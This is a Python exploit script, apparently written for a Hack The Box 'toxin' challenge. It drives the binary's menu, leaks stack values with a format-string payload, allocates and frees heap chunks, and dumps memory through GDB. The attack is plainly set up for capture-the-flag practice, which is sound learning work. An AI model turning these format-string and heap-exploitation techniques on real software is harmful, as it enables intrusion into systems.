import ipaddress
import pathlib
import re
import string
from core.gdb_wrapper import GdbWrapper
from core.generic_pwn import GenericPwn
from core.target_config import Config, Mode
from core.targetbase import TargetBase



class ToxinPwn(GenericPwn):
    @classmethod
    def create_toxin(cls, index: int, size: int, data: bytes):
        cls.logger.info(t.process.clean(0.2).decode(), "1")
        t.process.sendline(b"1")
        cls.logger.info(t.process.clean(0.2).decode(), hex(size))
        t.process.sendline(str(size).encode())
        cls.logger.info(t.process.clean(0.2).decode(), hex(index))
        t.process.sendline(str(index).encode())
        cls.logger.info(t.process.clean(0.2).decode(), data)
        t.process.sendline(data)

    @classmethod
    def search_toxin(cls, data: bytes):
        cls.logger.info(t.process.clean(0.2).decode(), "4")
        t.process.sendline(b"4")
        cls.logger.info(t.process.clean(0.2).decode(), data)
        t.process.sendline(data)
        result = t.process.clean(0.2).decode()
        cls.logger.info(result)
        return result

    @classmethod
    def free_toxin(cls, index: int):
        cls.logger.info(t.process.clean(0.2).decode(), "3")
        t.process.sendline(b"3")
        cls.logger.info(t.process.clean(0.2).decode(), hex(index))
        t.process.sendline(str(index).encode())

    @classmethod
    def edit_toxin(cls, index: int, data: bytes):
        cls.logger.info(t.process.clean(0.2).decode(), "2")
        t.process.sendline(b"2")
        cls.logger.info(t.process.clean(0.2).decode(), hex(index))
        t.process.sendline(str(index).encode())
        cls.logger.info(t.process.clean(0.2).decode(), data)
        t.process.sendline(data)

    @classmethod
    def read_stack(cls, pos: int=0):
        data = f"%{pos}$p"
        result = cls.search_toxin(data.encode())
        match = re.search(f'(0x[{string.hexdigits}]+)', result)
        cls.logger.info(result)
        if match:
            return match[1]
        return None


if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.local,
        # ip=ipaddress.IPv4Address('142.93.34.45'),
        # port=30006,
        file=pathlib.Path('/home/lim8en1/htb/projects/toxin/toxin_mod'),
        no_offset=True,
        detect_libc=True
    )

    signatures = (b'\xDE', b'\xC0', b'\xCA')
    max_allocate_size = 0xE0
    t = TargetBase(pwn_target=ToxinPwn, config=config)

    sizes = (0x80, 0x8a, 0x40)
    indices = (0, 1, 2)
    index_to_free = (0, 0)
    for index in indices:
        t.pwn_target.create_toxin(index, sizes[index], data=signatures[index] + str(index).encode() * 4 + b'\0')
        result = t.pwn_target.read_stack(1)

        if index == index_to_free[1]:
            t.pwn_target.free_toxin(index_to_free[0])
    # stack = []
    # for pos in range(1, 20):
    #     result = t.pwn_target.read_stack(pos)
    #     stack.append(result)
    # t.logger.debug("\n".join(f"{i}:{x}" if x else f"{i}:(null)" for i, x in enumerate(stack)))

    with GdbWrapper(t.process.pid) as debugger:
        debugger.resume()
        debugger.interrupt()
        toxin_freed = debugger.read_value('(long int)&toxinfreed')
        t.logger.debug(f"Toxin freed @ {toxin_freed}")
        sizes_address = debugger.read_value('(long int)&toxins')
        t.logger.debug(f"Values @ {sizes_address}")
        values = debugger.read_memory('(long int)&toxins', count=3, modifier='g')
        sizes_address = debugger.read_value('(long int)&sizes')
        t.logger.debug(f"Sizes @ {sizes_address}")
        sizes_read = debugger.read_memory('(long int)&sizes', count=3, modifier='g')

        for index in indices:
            address = values[index]
            data = bytearray(sizes_read[index]+0x10)
            data_as_list = debugger.read_memory(address, count=len(data))
            t.logger.debug(f"Address: {hex(address)}")
            for i, byte in enumerate(data_as_list):
                data[i] = byte
            pos = 0
            while pos < len(data):
                t.logger.debug(" ".join(f'{x:02x}' for x in data[pos:pos+0x10]))
                pos += 0x10
        debugger.resume()